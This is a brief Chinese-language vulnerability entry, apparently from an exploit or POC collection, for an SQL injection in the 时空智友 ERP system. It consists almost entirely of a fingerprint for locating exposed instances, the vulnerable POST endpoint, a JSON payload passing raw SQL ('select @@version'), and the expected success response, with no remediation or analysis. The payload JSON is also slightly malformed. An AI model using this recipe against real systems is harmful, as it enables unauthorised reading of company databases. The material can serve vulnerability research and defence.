# 时空智友ERPsqlResult存在SQL注入漏洞

时空智友 ｜ SQL注入 ｜ —
- **指纹**：`body="时空智友企业信息管理`
- **请求**：`POST /formservice?service=workflow.sqlResult HTTP/1.1`

**Payload**
```
"params": {
"hello": "world"
},
"sql": "select @@version"
}
```
- **响应特征**：200